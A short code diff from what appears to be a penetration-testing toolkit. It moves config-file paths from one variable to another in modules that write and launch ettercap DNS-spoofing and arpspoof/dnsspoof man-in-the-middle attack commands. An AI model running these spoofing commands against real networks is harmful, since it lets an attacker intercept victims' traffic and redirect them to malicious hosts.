@@ -105,7 +105,7 @@ if ettercapchoice == 'y':
             # spawn a child process
             os.chdir(cwd)
             time.sleep(5)
-            filewrite = open(setdir + "/ettercap", "w")
+            filewrite = open(userconfigpath + "ettercap", "w")
             filewrite.write(
                 "ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface, arp, bridge))
             filewrite.close()
@@ -147,8 +147,8 @@ if dsniffchoice == 'y':
             if dns_spoof == "":
                 dns_spoof = "*"
             subprocess.Popen(
-                "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (setdir), shell=True).wait()
-            filewrite = open(setdir + "/dnsspoof.conf", "w")
+                "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (userconfigpath), shell=True).wait()
+            filewrite = open(userconfigpath + "dnsspoof.conf", "w")
             filewrite.write("%s %s" % (ipaddr, dns_spoof))
             filewrite.close()
             print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
@@ -160,10 +160,10 @@ if dsniffchoice == 'y':
             gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
                 interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
             # open file for writing
-            filewrite = open(setdir + "/ettercap", "w")
+            filewrite = open(userconfigpath + "ettercap", "w")
             # write the arpspoof / dnsspoof commands to file
             filewrite.write(
-                "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, setdir))
+                "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, userconfigpath))
             # close the file
             filewrite.close()
             # change back to normal directory
